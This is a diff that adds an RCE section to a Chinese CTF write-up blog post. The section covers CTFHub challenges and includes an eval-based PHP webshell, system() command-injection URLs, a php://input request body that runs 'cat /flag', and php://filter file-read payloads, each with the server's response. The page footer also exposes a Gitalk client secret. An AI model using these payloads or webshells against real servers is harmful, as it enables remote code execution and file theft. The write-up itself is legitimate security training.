@@ -54,6 +54,13 @@
 <li><a href="#双写后缀">双写后缀</a></li>
 </ul>
 </li>
+<li><a href="#rce">RCE</a><ul>
+<li><a href="#eval执行">eval执行</a></li>
+<li><a href="#文件包含">文件包含</a></li>
+<li><a href="#phpinput">php://input</a></li>
+<li><a href="#读取源代码">读取源代码</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="#reverse">Reverse</a></li>
@@ -387,6 +394,82 @@
 <h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p>
 <p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p>
 <h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p>
+<h3><span id="rce">RCE</span></h3><h4><span id="eval执行">eval执行</span></h4><p>进入后题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试在URL中带上名为cmd的参数：（此处<code>system()</code>函数的作用为执行系统命令并输出执行结果）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;?cmd&#x3D;system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>执行成功 此处需要注意参数结尾一定不能省略<code>;</code>，满足PHP语法才可以执行成功。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system("ls%20/");</span><br><span class="line">.../?cmd=system("cat%20/flag_xxxx");</span><br></pre></td></tr></table></figure>
+
+<h4><span id="文件包含">文件包含</span></h4><ul>
+<li>考察<code>include</code>函数</li>
+</ul>
+<p>访问shell页面，发现有一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'ctfhub'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>假如在index.php中include了一个文件，那么不管这个文件后缀是什么  这个文件中的内容将会直接出现在index.php中，所以这道题的payload构造思路就是把shell.txt里的内容想办法放到index.php中去根据源码构造payload：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>直接使用蚁剑后缀加上payload即可</p>
+<h4><span id="phpinput">php://input</span></h4><p><a href="https://blog.csdn.net/qq_51295677/article/details/123462929" target="_blank" rel="noopener">参考文献</a></p>
+<p>常用到伪协议的<code>php://input</code>和<code>php://filter</code>.其中<code>php://input</code>要求<code>allow_url_include</code>设置为<code>On</code></p>
+<ul>
+<li>使用burp suite的repeater发送请求，构造请求报文</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line"></span><br><span class="line">&lt;?php system("cat /flag_5734");?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到返回</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 113</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line"></span><br><span class="line">ctfhub&#123;8c628d8ea62d6dc8316f15c3&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">i don't have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"phpinfo.php"</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4><span id="读取源代码">读取源代码</span></h4><p><a href="https://blog.csdn.net/qq_61839115/article/details/128593214" target="_blank" rel="noopener">参考</a></p>
+<ul>
+<li>考点：<code>php://filter</code>可以作为一个中间流来处理其他流，具有四个参数。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>指定了你要筛选过滤的数据流。</td>
+<td>必选</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这道题就直接构造payload了</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure>
+
+<p>有些比赛赛题情况下还要用base64输出</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+
+<p>使用burp suite</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://filter/resource=/flag HTTP/1.1</span><br><span class="line">Host: challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty/1.19.3.2</span><br><span class="line">Date: Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 106</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.40</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">Access-Control-Allow-Methods: *</span><br><span class="line"></span><br><span class="line">ctfhub&#123;d797f76a6ac67e494a84fa86&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">i don't have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1></div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="next" href="/2022/12/23/Spring%20Security/">Spring Security</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
   clientID: 'd154fff64901622afbb6',
   clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
